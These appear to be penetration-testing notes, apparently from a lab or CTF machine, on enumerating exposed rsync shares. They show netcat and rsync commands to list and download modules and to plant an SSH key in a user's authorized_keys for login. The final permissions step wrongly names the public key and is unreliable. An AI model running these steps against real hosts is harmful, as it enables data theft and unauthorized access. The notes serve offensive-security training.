# Rsync Enumeration

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync" %}

The first thing we do is follow this guide:&#x20;

```
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy        	
NAS_Public     	
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```

If after we try to list a share and there is just an OK. It means it isn't password protected which means we can freely list and upload files to the share.&#x20;

To list the share:

```
rsync -av --list-only rsync://192.168.0.123/shared_name
```

To download the share:&#x20;

```
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```

If we have credentials:&#x20;

```
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```

Take into account situational awareness, in the case of the machine fail, we were placed in a home folder for a user.&#x20;

So we can copy our own public key and paste the contents to an authorized\_keys file and transfer it using rsync.&#x20;

```
rsync -av blah/.ssh/authorized_keys rsync://username@192.168.0.123/home_user/.ssh
```

Change the permissions of the id\_rsa.pub key that we generated to 400 and we can ssh in.&#x20;
